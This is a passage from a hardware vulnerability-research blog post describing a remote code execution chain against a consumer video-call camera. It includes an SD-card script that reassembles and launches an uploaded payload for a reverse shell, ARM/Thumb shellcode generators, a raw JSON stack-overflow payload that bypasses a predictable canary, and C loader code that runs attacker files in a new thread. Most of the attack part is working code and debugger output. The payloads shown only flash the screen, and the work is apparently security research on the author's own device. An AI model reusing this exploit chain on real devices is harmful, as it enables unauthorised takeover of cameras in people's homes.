---
published: true
title: "🎥 [4] Exploiting All The Things"
toc: true
toc_sticky: true
categories:
  - VR
tags:
  - Exploitation
  - Memory Corruption
tagline: "After auditing a decent amount of the available surface, and finding several feasible vulnerabilities, it is time to exploit them for remote code execution!"
excerpt: "We should now have enough bugs to get remote code execution."
windowGradientStart: rgb(59, 59, 59)
windowGradientEnd: rgb(22, 22, 22)
windowBorder: rgb(0, 0, 0)
minimizeButton: rgb(255, 255, 255)
maximizeButton: rgb(0, 0, 255)
closeButton: rgb(255, 0, 0)
---

# SD Card File Write + *iperf* Binary

## Getting a Reverse Shell

From the research in the third blog of this channel, we now have both a bug that can write files to the SD card, and a bug that results in execution of a binary from the SD card. Therefore, we now have a way to get remote code execution (provided there is an SD card inserted)! However, the **iperf** file cannot be more than *0xc000*, and my reverse shell and *gdb* payloads are roughly 10x larger (thanks static linking).

At the time of the discovery of these bugs, I was still having to take the SD card out of the camera, flash the **iperf** binary I wanted to run as well as a **gdbserver-static** binary - safe to say I was getting very sick of this. So lets put that method to rest and work out how I can get the files on the device remotely and execute them. 

I remembered that **iperf** doesn't have to be a binary and that it can also be a */bin/ash* script, so all I have to do is send over small chunks of the file with the file write primitive (i.e. split the file into parts and write each part into a new file). Then once all of the parts are sent, I can simply recombine them into the full binary, make it executable, and run it from the script!

Here is the script I wrote to do this:

```
-bash
#!/bin/ash

# check if part exists
if [ ! -f /var/tmp/mmcblock0/iperf/part0 ]; then
	echo "Error: No part files found"
	exit 1
fi

# remove existing payload if already exists
rm -f /var/tmp/mmcblock0/iperf/payload

# init counter
i=0

# build the file from parts
while [ -f "/var/tmp/mmcblock0/iperf/part$i" ]; do
	cat "/var/tmp/mmcblock0/iperf/part$i" >> /var/tmp/mmcblock0/iperf/payload
	rm "/var/tmp/mmcblock0/iperf/part$i"
	i=$((i+1))
done

chmod +x /var/tmp/mmcblock0/iperf/payload

/var/tmp/mmcblock0/iperf/payload &
```

So all we need to do is the following:
1. Plug an SD card into the device
2. Send over the **iperf** script above with the file write
3. Use the file write to send chunks of the file into **part** files
4. Use the *RunIperfTest* command to execute the *ash* script
5. This recombines the parts into the full payload, makes it executable and runs it! 
6. We now have a fully remote reverse shell on the device

![im_in.png](/assets/images/video_call_camera_p3/im_in.png)

# Canary Weakness + Stack Overflow

Now onto the memory corruption! In the last blog, we discovered that they are actually using the address of the stack canary as the canary (meaning we can predict it 100% of the time), and we also found a stack overflow that allowed us to fix the canary while overwriting the register contents it is supposed to protect. This gave us control of pc, but how can we get full remote code execution with this?

## Memory Map

We need to get some code somewhere, lets take a look at the memory map:

```
Mapped address spaces:

	Start Addr   End Addr       Size     Offset  Perms   objfile
	    0x8000   0x5e4000   0x5dc000        0x0  r-xp   /usr/bin/App
	  0x5ec000   0x5f0000     0x4000   0x5dc000  r-xp   /usr/bin/App
	  0x5f0000   0x65c000    0x6c000   0x5e0000  rwxp   /usr/bin/App
	  0x65c000   0xb5c000   0x500000        0x0  rwxp   [heap]
	0xb45a8000 0xb45d7000    0x2f000        0x0  rwxp   
	0xb45d7000 0xb45d9000     0x2000        0x0  ---p   
	0xb45d9000 0xb46da000   0x101000        0x0  rwxp   
	0xb46da000 0xb46dc000     0x2000        0x0  ---p   
	0xb46dc000 0xb47dd000   0x101000        0x0  rwxp   
	0xb47dd000 0xb47df000     0x2000        0x0  ---p   
	0xb47df000 0xb48e0000   0x101000        0x0  rwxp   
	0xb48e0000 0xb48e2000     0x2000        0x0  ---p   
	0xb48e2000 0xb49e3000   0x101000        0x0  rwxp   
	0xb49e3000 0xb49e5000     0x2000        0x0  ---p   
	0xb49e5000 0xb4a06000    0x21000        0x0  rwxp   
	0xb4a06000 0xb4a08000     0x2000        0x0  ---p   
	0xb4a08000 0xb4b09000   0x101000        0x0  rwxp   
	0xb4b09000 0xb4b0b000     0x2000        0x0  ---p   
	0xb4b0b000 0xb4c0c000   0x101000        0x0  rwxp   
	0xb4c0c000 0xb4c0e000     0x2000        0x0  ---p   
	0xb4c0e000 0xb4c2f000    0x21000        0x0  rwxp   
	0xb4c2f000 0xb4c31000     0x2000        0x0  ---p   
	0xb4c31000 0xb4c52000    0x21000        0x0  rwxp   
	0xb4c52000 0xb4c54000     0x2000        0x0  ---p   
	0xb4c54000 0xb4d55000   0x101000        0x0  rwxp   
	0xb4d55000 0xb4d57000     0x2000        0x0  ---p   
	0xb4d57000 0xb4e58000   0x101000        0x0  rwxp   
	0xb4e58000 0xb4e5a000     0x2000        0x0  ---p   
	0xb4e5a000 0xb4f5b000   0x101000        0x0  rwxp   
	0xb4f5b000 0xb4f5d000     0x2000        0x0  ---p   
	0xb4f5d000 0xb505e000   0x101000        0x0  rwxp   
	0xb505e000 0xb5060000     0x2000        0x0  ---p   
	0xb5060000 0xb5161000   0x101000        0x0  rwxp   
	0xb5161000 0xb5163000     0x2000        0x0  ---p   
	0xb5163000 0xb5186000    0x23000        0x0  rwxp   
	0xb5186000 0xb5188000     0x2000        0x0  ---p   
	0xb5188000 0xb5289000   0x101000        0x0  rwxp   
	0xb5289000 0xb528b000     0x2000        0x0  ---p   
	0xb528b000 0xb53d8000   0x14d000        0x0  rwxp   
	0xb53d8000 0xb53da000     0x2000        0x0  ---p   
	0xb53da000 0xb54db000   0x101000        0x0  rwxp   
	0xb54db000 0xb54dd000     0x2000        0x0  ---p   
	0xb54dd000 0xb55de000   0x101000        0x0  rwxp   
	0xb55de000 0xb55e0000     0x2000        0x0  ---p   
	0xb55e0000 0xb56e1000   0x101000        0x0  rwxp   
	0xb56e1000 0xb56e3000     0x2000        0x0  ---p   
	0xb56e3000 0xb57e4000   0x101000        0x0  rwxp   
	0xb57e4000 0xb57e6000     0x2000        0x0  ---p   
	0xb57e6000 0xb58e7000   0x101000        0x0  rwxp   
	0xb58e7000 0xb58e9000     0x2000        0x0  ---p   
	0xb58e9000 0xb590a000    0x21000        0x0  rwxp   
	0xb590a000 0xb590c000     0x2000        0x0  ---p   
	0xb590c000 0xb592d000    0x21000        0x0  rwxp   
	0xb592d000 0xb5951000    0x24000 0x43e19000  rwxs   /dev/mmz_userdev
	0xb5951000 0xb59d2000    0x81000        0x0  rwxp   
	0xb59d2000 0xb59d4000     0x2000 0x43e17000  rwxs   /dev/mmz_userdev
	0xb59d4000 0xb59d5000     0x1000 0x43e16000  rwxs   /dev/mmz_userdev
	0xb59d5000 0xb59d6000     0x1000 0x43e15000  rwxs   /dev/mmz_userdev
	0xb59d6000 0xb59ef000    0x19000 0x43dfc000  rwxs   /dev/mmz_userdev
	0xb59ef000 0xb59f1000     0x2000        0x0  ---p   
	0xb59f1000 0xb5a12000    0x21000        0x0  rwxp   
	0xb5a12000 0xb5a14000     0x2000        0x0  ---p   
	0xb5a14000 0xb5b15000   0x101000        0x0  rwxp   
	0xb5b15000 0xb5b17000     0x2000        0x0  ---p   
	0xb5b17000 0xb5c18000   0x101000        0x0  rwxp   
	0xb5c18000 0xb5c1a000     0x2000        0x0  ---p   
	0xb5c1a000 0xb5c3b000    0x21000        0x0  rwxp   
	0xb5c3b000 0xb5c3d000     0x2000        0x0  ---p   
	0xb5c3d000 0xb5c5e000    0x21000        0x0  rwxp   
	0xb5c5e000 0xb5c60000     0x2000        0x0  ---p   
	0xb5c60000 0xb5c81000    0x21000        0x0  rwxp   
	0xb5c81000 0xb5c83000     0x2000        0x0  ---p   
	0xb5c83000 0xb5cf5000    0x72000        0x0  rwxp   
	0xb5cf5000 0xb5cf6000     0x1000 0x43de4000  rwxs   /dev/mmz_userdev
	0xb5cf6000 0xb5cf8000     0x2000 0x43de2000  rwxs   /dev/mmz_userdev
	0xb5cf8000 0xb5cfa000     0x2000        0x0  ---p   
	0xb5cfa000 0xb5d1b000    0x21000        0x0  rwxp   
	0xb5d1b000 0xb5d1d000     0x2000        0x0  ---p   
	0xb5d1d000 0xb5e1e000   0x101000        0x0  rwxp   
	0xb5e1e000 0xb5e4a000    0x2c000 0x43d0b000  rwxs   /dev/venc
	0xb5e4a000 0xb5f48000    0xfe000 0x438f3000  rwxs   /dev/venc
	0xb5f48000 0xb5fcc000    0x84000 0x438a7000  rwxs   /dev/venc
	0xb5fcc000 0xb5fce000     0x2000        0x0  ---p   
	0xb5fce000 0xb5fef000    0x21000        0x0  rwxp   
	0xb5fef000 0xb5ff1000     0x2000        0x0  ---p   
	0xb5ff1000 0xb6012000    0x21000        0x0  rwxp   
	0xb6012000 0xb6014000     0x2000        0x0  ---p   
	0xb6014000 0xb6035000    0x21000        0x0  rwxp   
	0xb6035000 0xb6037000     0x2000        0x0  ---p   
	0xb6037000 0xb6058000    0x21000        0x0  rwxp   
	0xb6058000 0xb6059000     0x1000        0x0  rwxs   /dev/shm/tmp-838946340 (deleted)
	0xb6059000 0xb608a000    0x31000        0x0  rwxs   /SYSV00001688 (deleted)
	0xb608a000 0xb608c000     0x2000        0x0  ---p   
	0xb608c000 0xb60ad000    0x21000        0x0  rwxp   
	0xb60ad000 0xb60b1000     0x4000 0x437a7000  rwxs   /dev/mmz_userdev
	0xb60b1000 0xb60b9000     0x8000 0x4379f000  rwxs   /dev/mmz_userdev
	0xb60b9000 0xb60bb000     0x2000        0x0  ---p   
	0xb60bb000 0xb60dc000    0x21000        0x0  rwxp   
	0xb60dc000 0xb60dd000     0x1000 0x4379e000  rwxs   /dev/mmz_userdev
	0xb60dd000 0xb60f3000    0x16000 0x43788000  rwxs   /dev/mmz_userdev
	0xb60f3000 0xb60f5000     0x2000        0x0  ---p   
	0xb60f5000 0xb6116000    0x21000        0x0  rwxp   
	0xb6116000 0xb6118000     0x2000        0x0  ---p   
	0xb6118000 0xb6139000    0x21000        0x0  rwxp   
	0xb6139000 0xb6159000    0x20000 0x11020000  rwxs   /dev/mem
	0xb6159000 0xb615a000     0x1000 0x43786000  rwxs   /dev/mmz_userdev
	0xb615a000 0xb615c000     0x2000 0x43784000  rwxs   /dev/mmz_userdev
	0xb615c000 0xb6163000     0x7000 0x4377d000  rwxs   /dev/mmz_userdev
	0xb6163000 0xb6164000     0x1000 0x4377d000  rwxs   /dev/mmz_userdev
	0xb6164000 0xb6165000     0x1000 0x4377c000  rwxs   /dev/mmz_userdev
	0xb6165000 0xb6166000     0x1000 0x4377c000  rwxs   /dev/mmz_userdev
	0xb6166000 0xb6167000     0x1000 0x4377c000  rwxs   /dev/mmz_userdev
	0xb6167000 0xb6180000    0x19000 0x43761000  rwxs   /dev/sys
	0xb6180000 0xb61e4000    0x64000 0x436ef000  rwxs   /dev/sys
	0xb61e4000 0xb61f4000    0x10000 0x436de000  rwxs   /dev/mmz_userdev
	0xb61f4000 0xb61f6000     0x2000        0x0  ---p   
	0xb61f6000 0xb62f7000   0x101000        0x0  rwxp   
	0xb62f7000 0xb62f9000     0x2000        0x0  ---p   
	0xb62f9000 0xb631a000    0x21000        0x0  rwxp   
	0xb631a000 0xb631c000     0x2000        0x0  ---p   
	0xb631c000 0xb633d000    0x21000        0x0  rwxp   
	0xb633d000 0xb633f000     0x2000        0x0  ---p   
	0xb633f000 0xb6360000    0x21000        0x0  rwxp   
	0xb6360000 0xb6362000     0x2000        0x0  ---p   
	0xb6362000 0xb6463000   0x101000        0x0  rwxp   
	0xb6463000 0xb6465000     0x2000        0x0  ---p   
	0xb6465000 0xb6566000   0x101000        0x0  rwxp   
	0xb6566000 0xb6568000     0x2000        0x0  ---p   
	0xb6568000 0xb6589000    0x21000        0x0  rwxp   
	0xb6589000 0xb658b000     0x2000        0x0  ---p   
	0xb658b000 0xb698d000   0x402000        0x0  rwxp   
	0xb698d000 0xb698f000     0x2000        0x0  ---p   
	0xb698f000 0xb6a90000   0x101000        0x0  rwxp   
	0xb6a90000 0xb6a92000     0x2000        0x0  ---p   
	0xb6a92000 0xb6b93000   0x101000        0x0  rwxp   
	0xb6b93000 0xb6b95000     0x2000        0x0  ---p   
	0xb6b95000 0xb6c96000   0x101000        0x0  rwxp   
	0xb6c96000 0xb6c98000     0x2000        0x0  ---p   
	0xb6c98000 0xb6cb9000    0x21000        0x0  rwxp   
	0xb6cb9000 0xb6cbb000     0x2000        0x0  ---p   
	0xb6cbb000 0xb6cdc000    0x21000        0x0  rwxp   
	0xb6cdc000 0xb6ced000    0x11000        0x0  r-xp   /lib/libgcc_s.so.1
	0xb6ced000 0xb6cee000     0x1000     0x9000  r-xp   /lib/libgcc_s.so.1
	0xb6cee000 0xb6cef000     0x1000     0xa000  rwxp   /lib/libgcc_s.so.1
	0xb6cef000 0xb6d1c000    0x2d000        0x0  r-xp   /lib/libgomp.so.1.0.0
	0xb6d1c000 0xb6d1d000     0x1000    0x25000  r-xp   /lib/libgomp.so.1.0.0
	0xb6d1d000 0xb6d1e000     0x1000    0x26000  rwxp   /lib/libgomp.so.1.0.0
	0xb6d1e000 0xb6e65000   0x147000        0x0  r-xp   /lib/libstdc++.so.6.0.24
	0xb6e65000 0xb6e6b000     0x6000   0x13f000  r-xp   /lib/libstdc++.so.6.0.24
	0xb6e6b000 0xb6e6c000     0x1000   0x145000  rwxp   /lib/libstdc++.so.6.0.24
	0xb6e6c000 0xb6e6d000     0x1000        0x0  rwxp   
	0xb6e6d000 0xb6e85000    0x18000        0x0  r-xp   /lib/libXMcrypto.so
	0xb6e85000 0xb6e86000     0x1000    0x10000  r-xp   /lib/libXMcrypto.so
	0xb6e86000 0xb6e87000     0x1000    0x11000  rwxp   /lib/libXMcrypto.so
	0xb6e87000 0xb6eca000    0x43000        0x0  r-xp   /lib/libXmDvr.so
	0xb6eca000 0xb6ecb000     0x1000    0x3b000  r-xp   /lib/libXmDvr.so
	0xb6ecb000 0xb6ecc000     0x1000    0x3c000  rwxp   /lib/libXmDvr.so
	0xb6ecc000 0xb6ed7000     0xb000        0x0  rwxp   
	0xb6ed7000 0xb6f13000    0x3c000        0x0  r-xp   /lib/libXmComm.so
	0xb6f13000 0xb6f14000     0x1000    0x34000  r-xp   /lib/libXmComm.so
	0xb6f14000 0xb6f15000     0x1000    0x35000  rwxp   /lib/libXmComm.so
	0xb6f15000 0xb6f25000    0x10000        0x0  r-xp   /lib/libXmJson.so
	0xb6f25000 0xb6f26000     0x1000     0x8000  r-xp   /lib/libXmJson.so
	0xb6f26000 0xb6f27000     0x1000     0x9000  rwxp   /lib/libXmJson.so
	0xb6f27000 0xb6fc1000    0x9a000        0x0  r-xp   /lib/libc.so
	0xb6fc1000 0xb6fc2000     0x1000 0x4377c000  rwxs   /dev/mmz_userdev
	0xb6fc2000 0xb6fc3000     0x1000 0x4377c000  rwxs   /dev/mmz_userdev
	0xb6fc3000 0xb6fc5000     0x2000 0x4377a000  rwxs   /dev/mmz_userdev
	0xb6fc5000 0xb6fc6000     0x1000        0x0  r-xs   /mnt/mtd/Config/localtime
	0xb6fc6000 0xb6fc7000     0x1000        0x0  rwxs   /SYSV010c0099 (deleted)
	0xb6fc7000 0xb6fc8000     0x1000        0x0  rwxs   /SYSV00000000 (deleted)
	0xb6fc8000 0xb6fca000     0x2000    0x99000  rwxp   /lib/libc.so
	0xb6fca000 0xb6fcc000     0x2000        0x0  rwxp   
	0xbeeeb000 0xbef0c000    0x21000        0x0  rwxp   [stack]
	0xbefb4000 0xbefb5000     0x1000        0x0  r-xp   [sigpage]
	0xbefb5000 0xbefb6000     0x1000        0x0  r--p   [vvar]
	0xbefb6000 0xbefb7000     0x1000        0x0  r-xp   [vdso]
	0xffff0000 0xffff1000     0x1000        0x0  r-xp   [vectors]
```

A few things to take from this:
- They are clearly using the weak Linux ASLR that only jumbles the location of the stack and shared objects which is handy
- The stack, heap, and global memory regions are both writeable and executable? That is very brave!

## HTTP Server Buffers

While taking a look at the HTTP server contents and looking for bugs, I remembered seeing lots of global buffers that data gets copied into. If you think back to the third blog in this channel, the integer underflow was impacting a copy into a global memory buffer for the username (and there was also a buffer for the password). Both of these are 64 bytes and we know that they are executable, so these will definitely be useful.

I also remembered seeing that a pointer to the main buffer that receives the raw HTTP request is stored at a fixed location in memory. This buffer is a *0x20000* allocation on the heap, so if we could execute some code in there we should have plenty of room to do some interesting things!

![http_buffer_allocation.png](/assets/images/video_call_camera_p5/http_buffer_allocation.png)

### Plan

Due to the lack of mitigations, it was quite easy to come up with a plan to get execution with the buffers I mentioned above:

1. Send a HTTP request that contains the following:
  - The specified 'username' is a single ARM instruction that branches to the contents of a register which is set in the next request (+1 because we want thumb instructions to save space and avoid null characters)
  - The specified 'password' is a small thumb payload that loads the address of the pointer to the large http buffer, increments it as to jump to code after the main HTTP contents, and branches to this location
  - After the main HTTP contents is our stage 1 payload
2. Next, trigger the stack overflow, fix the canary, set one of the registers to be the location of the 'username' buffer so that it can be jumped into (which then branches to thumb instructions, and jumps to main stage 1 payload in large buffer)

Here are the functions that generate the username and password buffer payloads:

```
-python
def generate_jump_to_thumb(password_addr):   
    # Create the shellcode
    instructions = asm(f'''
        bx r7
    ''', arch='arm', endian='little')
    
    return instructions
```

```
-python
def generate_thumb_pointer_jump(ptr_addr, base_addr=0):   
    # Create the shellcode
    instructions = asm(f'''
        ldr r3, [pc, #0x8]  /* Load address of pointer from literal pool */
        ldr r4, [pc, #0xc]  /* load key */
        eors r3, r4         /* get original pointer */
        ldr r3, [r3]        /* Load value from the pointer */
        adds r3, #0x50      /* add offset */
        bx r3               /* Jump to the loaded address */
    ''', arch='thumb', endian='little')

    literal_pool = p32(ptr_addr ^ 0xffffffff) + p32(0xffffffff)
    
    return instructions + literal_pool
```

And here is the JSON payload that triggers the overflow, it isn't pretty but it works:

```
json_byte_payload = b'{"Name": "FTP", "FTP": {"Server": {"Name": "' + 15* b"a" + 119 * b"b" + b'.' +119 * b"c" + b'.' + 119 * b"d" + b'.' + 119 * b"e" + b'.'
json_byte_payload += b'....'
json_byte_payload += b'\x30\xb2\x65..' # canary
json_byte_payload += b'a'*15
json_byte_payload += b'\x1d\x8b\x66..' # address of password buffer containing thumb instructions (therefore add 1)
json_byte_payload += b'a'*15 
json_byte_payload += b'\x64\x8b\x66..' # address of username buffer we jump to containing arm instructions
json_byte_payload += b'a'*10
json_byte_payload += b'", "Port": 9898, "UserName": "aaaaaaa", "Password": "bbbbbbb"}}, "SessionID": "0x0001869f"}'
```

### Testing

Setting the contents of stage 1 to be an invalid instruction (*0xffffffff*) we observe the following crash:

```
Thread 42 "NetIPManager" received signal SIGILL, Illegal instruction.
[Switching to Thread 640.736]
0xb3853070 in ?? ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$r0  : 0xffffffff
$r1  : 0x0       
$r2  : 0x0       
$r3  : 0xb3853060
$r4  : 0xffffffff
$r5  : 0x61616161 ("aaaa"?)
$r6  : 0x61616161 ("aaaa"?)
$r7  : 0x00668b1d  →  0x634c034b
$r8  : 0x61616112
$r9  : 0x61616161 ("aaaa"?)
$r10 : 0x61616161 ("aaaa"?)
$r11 : 0x61616161 ("aaaa"?)
$r12 : 0xb5159690  →  0x00000000
$sp  : 0xb5159a30  →  "\naaaaaaaaaa"
$lr  : 0x0041ddf4  →   mvn r7,  #0
$pc  : 0xb3853070
$cpsr: [NEGATIVE zero carry overflow interrupt fast thumb]
```

And this is what *pc* is pointing at:

```
(remote) gef➤  x/4xw $pc
0xb3853070:	0xffffffff	0x41414141	0x41414141	0x41414141
```

Nice! We can see the *0xffffffff* we put to trigger the crash, and some A's I placed after it.

![nice.webp](/assets/images/video_call_camera_p5/nice.webp)

## Fixing Up Execution

I expected this to be a bit of a pain to fix, mainly because a lot of my exploits ended up somehow destroying the stack (even the heap overflow from the *Action Camera* channel!). Lets take a quick look at the stack frame layout, and work out where the stack pointer is looking when we get execution.

![stack_layout.png](/assets/images/video_call_camera_p5/stack_layout.png)

I realised that we don't actually touch the stack pointer, so we should be able to simply jump to the error condition of the function above it in the stack frame, and everything should carry on without any issues.

![fixup.png](/assets/images/video_call_camera_p5/fixup.png)

I put this code together that simply jumps to *0x41e040* to see if executing this stops the crash.

```
-python
def generate_fixup_example_payload():
    # need to jump to 0x41e040 as this is an error handler in above function
    fixup_address = 0x41e040

    instructions = asm(f'''
        ldr r5, [pc, #0x8]  /* Load address of pointer from literal pool */
        ldr r6, [pc, #0x8]  /* load key */
        eor r5, r5, r6         /* get original pointer */
        bx r5               /* Jump to the loaded address */
    ''', arch='arm', endian='little')

    literal_pool = p32(fixup_address ^ 0xffffffff) + p32(0xffffffff)

    return instructions + literal_pool
```

After replacing the *0xffffffff* insruction we executed before with these thumb instructions (remember null is a bad character, hence the XOR business in the above payload) the camera responds to the malformed request with an error code and execution continues as expected!

![payload_meme.jpeg](/assets/images/video_call_camera_p5/payload_meme.jpeg)

## Spawning a Thread

So right now, we are getting execution, and then immediately fixing up and returning to normal execution, which is no fun. Ideally, because of the watchdog issue, and to maintian normal functionality, it would be great if we could spawn a thread and run a payload there.

### Executing a C Payload

As we are executing in the large HTTP buffer, I can simply compile a C file and extract the binary to load into memory - appending it to my HTTP request to get it into memory. We can then add a couple of instructions to the fixup payload that branch to the larger payload using *blx* so that execution continues in the fixup when our payload is finished.

Here is the simple modification to the fixup function:

```
-python
def generate_fixup_example_payload():
    # need to jump to 0x41e040 as this is an error handler in above function
    fixup_address = 0x41e040

    instructions = asm(f'''
        add r3, r3, #0x40    @ Add 0x40 to r3
        blx r3               @ Branch with link to address in r3
        ldr r5, [pc, #0x8]  /* Load address of pointer from literal pool */
        ldr r6, [pc, #0x8]  /* load key */
        eor r5, r5, r6         /* get original pointer */
        bx r5               /* Jump to the loaded address */
    ''', arch='arm', endian='little')

    literal_pool = p32(fixup_address ^ 0xffffffff) + p32(0xffffffff)

    return instructions + literal_pool
```

We can use an identical method to either the *Camera* or *Action Camera* projects, so refer back to those projects for more details.

### Screen Flash Payload

As a tester, I did a bit of reversing in the binary to find something I could use to check that my C payload was executing properly. I initially was going to flash a light, but I quickly realised there isn't one on this camera, so I went with the screen instead.

I located a function which sets the brightness of the display, so that I could turn the screen on and off in a loop to indicate that my C payload is executing. Here is the code I put together:

```
-c
#include <stdint.h>

#define LibXmDvr_SpiLcd_setLuminance_ADDR 0x13008
#define SLEEP_ADDR 0x11c10

typedef int LibXmDvr_SpiLcd_setLuminance_t(uint32_t luminance);
typedef uint32_t sleep_t(uint32_t seconds);

int _start(void) {
    LibXmDvr_SpiLcd_setLuminance_t *LibXmDvr_SpiLcd_setLuminance = (LibXmDvr_SpiLcd_setLuminance_t *) LibXmDvr_SpiLcd_setLuminance_ADDR;
    sleep_t *sleep = (sleep_t*) SLEEP_ADDR;

    char flippy = 0;
    while(1){
        uint32_t new_setting;
        if (flippy == 0){
            new_setting = 0x46;
            flippy = 1;
        } else {
            new_setting = 0x0;
            flippy = 0;
        }
        LibXmDvr_SpiLcd_setLuminance(new_setting);
        sleep(1);
    }
}
```

And that worked great, but obviously as it is an infinite loop the watchdog puts the **App** process out of its misery after a while:

![flash.gif](/assets/images/video_call_camera_p5/flash.gif)

### Dispatcher Payload

So now we have a way of executing a C payload, and a payload that we can use as a tester for our dispatcher payload, lets put the dispatcher payload together!

To upload the main thread function I want to dispatch, while making it so that I don't have to modify the dispatcher payload for each file, I made a payload that loads the contents of a file on the SD card into a heap-allocated buffer. The is then executed as a function in its own thread. 

Also, for some reason standard libc functions such as **fopen**, **open**, and **read** were giving me *SIGILL* faults - I still have no idea why this was happening, but I reverse engineered how files were being used in other places in the **App** process and was able to use this method instead.

The dispatcher payload does the following:
- Opens the **/var/tmp/mmcblock0/iperf/main** file
- Reads the contents into a buffer which it allocated earlier
- Closes the file
- Creates a new thread which executes the contents of the buffer as a function (thanks executable heap!)
- Detaches the spawned thread and exits

Here is the code:

***dispatcher.h***

```
-c
#include <stdint.h>

#define MALLOC_ADDR 0x1254c
#define PTHREAD_CREATE_ADDR 0x118f8
#define PTHREAD_DETACH_ADDR 0x12f60
#define SLEEP_ADDR 0x11c10

#define CREATE_FILE_STRUCT_ADDR 0x22c70
#define OPEN_FILE_ADDR 0x22e68
#define READ_FILE_ADDR 0x22378
#define CLOSE_FILE_ADDR 0x225ac
#define GET_FILE_SIZE_ADDR 0x22428

typedef unsigned long int pthread_t;

struct pthread_attr_t {
    unsigned int flags;
    void* stack_base;
    unsigned int stack_size;
    unsigned int guard_size;
    unsigned int sched_policy;
    unsigned int sched_priority;
};

struct file_struct {
    void* json_function_table;
    void* structure;
};

typedef void* (*malloc_t)(uint32_t size);
typedef int (*pthread_create_t)(pthread_t* thread, struct pthread_attr_t *attr,
    void *(*start_routine)(void*), void *arg);
typedef int (*pthread_detach_t)(pthread_t thread);
typedef uint32_t (*sleep_t)(uint32_t seconds);

typedef struct file_struct* (*create_file_struct_t)(struct file_struct*);
typedef int (*open_file_struct_t)(struct file_struct*, char*, uint32_t);
typedef int (*read_file_t)(struct file_struct*, void* buffer, uint32_t count);
typedef int (*get_file_size_t)(struct file_struct*);
typedef int (*close_file_t)(struct file_struct*);

typedef void (*program_func_t)();
```

***dispatcher.c***

```
-c
#include <stdint.h>
#include "dispatcher.h"

int _start() {
    malloc_t malloc = (malloc_t) MALLOC_ADDR;
    pthread_create_t pthread_create = (pthread_create_t) PTHREAD_CREATE_ADDR;
    pthread_detach_t pthread_detach = (pthread_detach_t) PTHREAD_DETACH_ADDR;
    sleep_t sleep = (sleep_t) SLEEP_ADDR;

    create_file_struct_t create_file_struct = (create_file_struct_t) CREATE_FILE_STRUCT_ADDR;
    open_file_struct_t open_file_struct = (open_file_struct_t) OPEN_FILE_ADDR;
    read_file_t read_file = (read_file_t) READ_FILE_ADDR;
    get_file_size_t get_file_size = (get_file_size_t) GET_FILE_SIZE_ADDR;
    close_file_t close_file = (close_file_t) CLOSE_FILE_ADDR;

    struct file_struct file_desc;
    create_file_struct(&file_desc);

    int fd = open_file_struct(&file_desc, "/var/tmp/mmcblock0/iperf/main", 0x0);

    uint8_t* buffer = (uint8_t*) malloc(0x10000);

    read_file(&file_desc, buffer, 0x10000);

    close_file(&file_desc);

    pthread_t thread;
    program_func_t program = (program_func_t)buffer;
    pthread_create(&thread, 0, (void*(*)(void*))program, 0);

    pthread_detach(thread);

    return 0;
}
```

So after adding a function call to upload the **screenflash** binary to the SD card as the **main** file, we get the exact same result as above, but as execution is occuring in its own thread, it no longer crashes after a while!

# Payloads

We can now inject arbitrary code into its own thread using the stack overflow + canary bypass, lets do something interesting with it! First we need to figure out how some bits of the camera work.

## Reversing the Screen

Obviously we want to mess with the screen, as that is the entire reason I purchased the camera in the first place!

I started off by searching for display-related strings, eventually *spi* revealed the presense of these functions from an imported shared library:

![spi_functions.png](/assets/images/video_call_camera_p5/spi_functions.png)

After looking into how these functions were used, I was able to locate where the screen sizes and display buffers were being stored in memory:

![buffer_init.png](/assets/images/video_call_camera_p5/buffer_init.png)

Note that there is a nice clue what the colour format they use, **malloc(size << 1)** means they are allocating two bytes for each pixel, implying RGB 5:6:5 (or something similar) is the format of the data in the *dispTransBuffer*.

Looking at references to this function, I eventually proved that this is the buffer being used to send over SPI:

![transbuffer_send_call.png](/assets/images/video_call_camera_p5/transbuffer_send_call.png)

![screen_spi_write.png](/assets/images/video_call_camera_p5/screen_spi_write.png)

Therefore, we should be able to use this buffer (as we know where it is located) and modify it, then we can call **LibXmDvr_SpiLcd_sendData** with identical arguments to write our own data to the screen.

### Blocking Screen Updates

As we want complete control of the *dispTransBuffer*, it would be ideal if we could stop other threads from overwriting our changes. Luckily, this was quite simple after some reverse engineering. Essentially, there is a location in global memory that contains a pointer to a struct, which contains the address of the callback function to update the contents of the screen with standard stuff (time + wallpaper). 

![callback.png](/assets/images/video_call_camera_p5/callback.png)

We don't want this callback to be called, so we can simply overwrite the callback address with a *0x0*, and we will have the screen all to ourselves. Here is the code that does this:

```
-c
uint32_t weird_struct_address = 0x669bf8;
uint32_t weird_struct_ptr = *(uint32_t*) weird_struct_address;
uint32_t* weird_struct = (uint32_t*) weird_struct_ptr;
weird_struct[0xf] = 0x0;
```

### RGB

With the reversing done, it is time to take control of the screen! I chose to flash between red, green and blue to make sure my understanding of the colour format was correct:

```
-c
#include <stdint.h>

#define LibXmDvr_SpiLcd_setLuminance_ADDR 0x13008
#define LibXmDvr_SpiLcd_sendData_ADDR 0x1173c
#define SLEEP_ADDR 0x11c10
#define MALLOC_ADDR 0x1254c

typedef int LibXmDvr_SpiLcd_setLuminance_t(uint32_t luminance);
typedef uint32_t LibXmDvr_SpiLcd_sendData_t(uint32_t val1, uint32_t val2, uint16_t* buffer, uint32_t buffer_size);
typedef uint32_t sleep_t(uint32_t seconds);
typedef void* (*malloc_t)(uint32_t size);

int _start(void) {
    LibXmDvr_SpiLcd_setLuminance_t *LibXmDvr_SpiLcd_setLuminance = (LibXmDvr_SpiLcd_setLuminance_t *) LibXmDvr_SpiLcd_setLuminance_ADDR;
    sleep_t *sleep = (sleep_t*) SLEEP_ADDR;
    LibXmDvr_SpiLcd_sendData_t *LibXmDvr_SpiLcd_sendData = (LibXmDvr_SpiLcd_sendData_t *) LibXmDvr_SpiLcd_sendData_ADDR;
    malloc_t malloc = (malloc_t) MALLOC_ADDR;

    // overwrite draw to screen callback in struct at 

    uint32_t weird_struct_address = 0x669bf8;
    uint32_t weird_struct_ptr = *(uint32_t*) weird_struct_address;
    uint32_t* weird_struct = (uint32_t*) weird_struct_ptr;
    weird_struct[0xf] = 0x0;

    uint32_t trans_buffer_pointer_address = 0x669bd8;
    uint32_t trans_buffer_address = *(uint32_t*) trans_buffer_pointer_address;
    uint16_t* trans_buffer = (uint16_t*) trans_buffer_address;

    uint32_t height = 320;
    uint32_t width = 240;
    uint32_t buffer_size = height * width * 2;

    uint8_t color_state = 0;  // 0=red, 1=green, 2=blue
    
    while(1) {
        LibXmDvr_SpiLcd_setLuminance(0x46);
        
        // Fill buffer with current color
